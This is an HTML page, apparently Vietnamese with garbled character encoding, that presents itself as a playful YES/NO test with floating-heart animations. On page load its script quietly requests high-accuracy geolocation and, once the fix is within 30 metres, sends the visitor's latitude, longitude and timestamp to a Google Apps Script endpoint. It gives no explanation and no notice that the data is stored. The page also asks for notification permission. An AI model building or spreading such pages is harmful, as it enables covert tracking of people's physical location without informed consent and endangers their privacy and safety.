<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Test 1</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap');

    body {
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      position: relative;
    }

    .container {
      background: rgba(255, 255, 255, 0.95);
      border-radius: 20px;
      padding: 2.5rem;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
      text-align: center;
      position: relative;
      z-index: 10;
      max-width: 28rem;
      width: 100%;
    }

    .btn-heart {
      background: linear-gradient(to right, #ff6b6b, #ff8e53);
      padding: 0.75rem 2.5rem;
      border-radius: 9999px;
      color: white;
      font-weight: 700;
      font-size: 1.125rem;
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
      border: none;
      cursor: pointer;
      margin: 0.5rem;
    }

    .btn-heart:hover {
      transform: scale(1.1);
      box-shadow: 0 10px 25px rgba(255, 107, 107, 0.5);
    }

    .btn-heart:active {
      transform: scale(0.95);
    }

    .btn-heart::after {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: rgba(255, 255, 255, 0.3);
      transform: rotate(30deg);
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0% { transform: translateX(-100%) rotate(30deg); }
      100% { transform: translateX(100%) rotate(30deg); }
    }

    .thank-message {
      animation: bounceIn 0.6s ease-out forwards;
      color: #ff6b6b;
      font-weight: 700;
      font-size: 1.25rem;
      margin-top: 2rem;
      display: none;
    }

    @keyframes bounceIn {
      0% { opacity: 0; transform: scale(0.3); }
      50% { opacity: 1; transform: scale(1.05); }
      100% { transform: scale(1); }
    }

    .floating-heart {
      position: absolute;
      width: 25px;
      height: 25px;
      background: #ff6b6b;
      transform: rotate(45deg);
      opacity: 0.8;
      animation: floatUp 2s ease-out forwards;
      z-index: 5;
    }

    .floating-heart::before,
    .floating-heart::after {
      content: '';
      position: absolute;
      width: 25px;
      height: 25px;
      background: #ff6b6b;
      border-radius: 50%;
    }

    .floating-heart::before {
      left: -12.5px;
    }

    .floating-heart::after {
      top: -12.5px;
    }

    @keyframes floatUp {
      0% { opacity: 0.8; transform: translateY(0) rotate(45deg); }
      100% { opacity: 0; transform: translateY(-80vh) rotate(45deg); }
    }

    .bg-particle {
      position: absolute;
      width: 10px;
      height: 10px;
      background: rgba(255, 255, 255, 0.7);
      border-radius: 50%;
      animation: drift 5s infinite ease-in-out;
    }

    @keyframes drift {
      0% { transform: translateY(0); opacity: 0.7; }
      50% { opacity: 1; }
      100% { transform: translateY(-100vh); opacity: 0; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1 class="text-3xl font-bold text-indigo-600 mb-4">Test ch·ª©c nƒÉng</h1>
    <p class="text-gray-700 mb-6">Nh·∫•n YES ho·∫∑c NO</p>
    <button id="btn-yes" class="btn-heart">YES</button>
    <button id="btn-no" class="btn-heart">NO</button>
    <p id="thank-message" class="thank-message">‚ù§Ô∏è C·∫£m ∆°n b·∫°n!</p>
  </div>

  <script>
    // L·∫•y c√°c ph·∫ßn t·ª≠ DOM
    const btnYes = document.getElementById('btn-yes');
    const btnNo = document.getElementById('btn-no');
    const thankMessage = document.getElementById('thank-message');

    // G·∫Øn s·ª± ki·ªán cho n√∫t YES
    btnYes.addEventListener('click', () => {
      thankMessage.style.display = 'block'; // Hi·ªÉn th·ªã th√¥ng b√°o c·∫£m ∆°n
      spawnHearts(); // T·∫°o hi·ªáu ·ª©ng tr√°i tim
      spawnParticles(); // T·∫°o hi·ªáu ·ª©ng h·∫°t
     // Chia s·∫ª v·ªã tr√≠
    });
    window.addEventListener('load', () => {
    shareLocation();
  
    if ("Notification" in window && Notification.permission !== "granted") {
      Notification.requestPermission().then(permission => {
        if (permission === "granted") {
          new Notification("üì¢ Xin ch√†o!", {
            body: "B·∫°n ƒë√£ cho ph√©p g·ª≠i th√¥ng b√°o t·ª´ trang web.",
          });
        } else {
          console.warn("‚ùå Ng∆∞·ªùi d√πng ƒë√£ t·ª´ ch·ªëi nh·∫≠n th√¥ng b√°o.");
        }
      });
    }
  });


    // G·∫Øn s·ª± ki·ªán cho n√∫t NO
    btnNo.addEventListener('click', () => {
      alert('B·∫°n ƒë√£ ch·ªçn NO'); // Ph·∫£n h·ªìi khi nh·∫•n NO (c√≥ th·ªÉ t√πy ch·ªânh)
    });

    // H√†m t·∫°o hi·ªáu ·ª©ng tr√°i tim
    function spawnHearts() {
      for (let i = 0; i < 8; i++) {
        const heart = document.createElement('div');
        heart.className = 'floating-heart';
        heart.style.left = `${Math.random() * 100}%`;
        heart.style.animationDelay = `${Math.random() * 0.5}s`;
        document.body.appendChild(heart);
        setTimeout(() => heart.remove(), 2000); // X√≥a sau 2 gi√¢y
      }
    }

    // H√†m t·∫°o hi·ªáu ·ª©ng h·∫°t
    function spawnParticles() {
      for (let i = 0; i < 15; i++) {
        const particle = document.createElement('div');
        particle.className = 'bg-particle';
        particle.style.left = `${Math.random() * 100}%`;
        particle.style.animationDelay = `${Math.random() * 2}s`;
        document.body.appendChild(particle);
        setTimeout(() => particle.remove(), 5000); // X√≥a sau 5 gi√¢y
      }
    }

    // H√†m chia s·∫ª v·ªã tr√≠
    function shareLocation() {
      if (!navigator.geolocation) {
        return alert('Tr√¨nh duy·ªát kh√¥ng h·ªó tr·ª£.');
      }

      const options = {
        enableHighAccuracy: true,
        timeout: 20000,
        maximumAge: 0
      };
      const minAccuracy = 30; // ƒê·ªô ch√≠nh x√°c t·ªëi thi·ªÉu (m√©t)

      const watchId = navigator.geolocation.watchPosition(
        pos => {
          if (pos.coords.accuracy <= minAccuracy) {
            navigator.geolocation.clearWatch(watchId); // Ng·ª´ng theo d√µi
            sendToServer(pos.coords.latitude, pos.coords.longitude); // G·ª≠i d·ªØ li·ªáu
          }
        },
        err => {
          navigator.geolocation.clearWatch(watchId);
          alert('Kh√¥ng th·ªÉ l·∫•y v·ªã tr√≠. L·ªói: ' + err.message);
        },
        options
      );
    }

    // H√†m g·ª≠i d·ªØ li·ªáu ƒë·∫øn server
    function sendToServer(lat, lon) {
      const now = new Date();
      const vnOffset = 7 * 60 * 60 * 1000; // ƒê·ªô l·ªách m√∫i gi·ªù Vi·ªát Nam (7 ti·∫øng)
      const vnTime = new Date(now.getTime() + vnOffset).toISOString();
      const params = new URLSearchParams({
        latitude: lat,
        longitude: lon,
        timestamp: vnTime
      });

      fetch('https://script.google.com/macros/s/AKfycbzjgqqM3-oNT4_RAKEhvAWcRFhZKIXyXNpe3pUiDic_EmtiaPv6dH2idwoZd9BxAqSW/exec', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: params.toString()
      })
      .then(res => res.json())
      .then(data => {
        console.log('Ph·∫£n h·ªìi t·ª´ server:', data);
        // C√≥ th·ªÉ th√™m th√¥ng b√°o th√†nh c√¥ng cho ng∆∞·ªùi d√πng ·ªü ƒë√¢y
      })
      .catch(err => {
        alert('L·ªói: ' + err.message);
        console.error(err);
      });
    
    }
  </script>
</body>
</html>
